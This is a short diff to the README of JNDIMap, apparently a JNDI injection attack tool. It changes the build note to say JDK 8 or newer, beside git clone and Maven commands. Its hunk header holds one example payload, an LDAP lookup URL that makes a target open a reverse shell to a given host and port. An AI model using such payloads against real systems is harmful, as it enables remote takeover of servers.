@@ -92,9 +92,10 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 ## ⚙️ Compile
 
-[Releases](https://github.com/X1r0z/JNDIMap/releases) includes stable and snapshot versions (the latest version automatically built based on the main branch). You can also pull the source code and compile it yourself (based on JDK 8)
+[Releases](https://github.com/X1r0z/JNDIMap/releases) includes stable and snapshot versions (the latest version automatically built based on the main branch). You can also pull the source code and compile it yourself
 
 ```bash
+# JDK 8+
 git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
 mvn package -Dmaven.test.skip=true
 ```
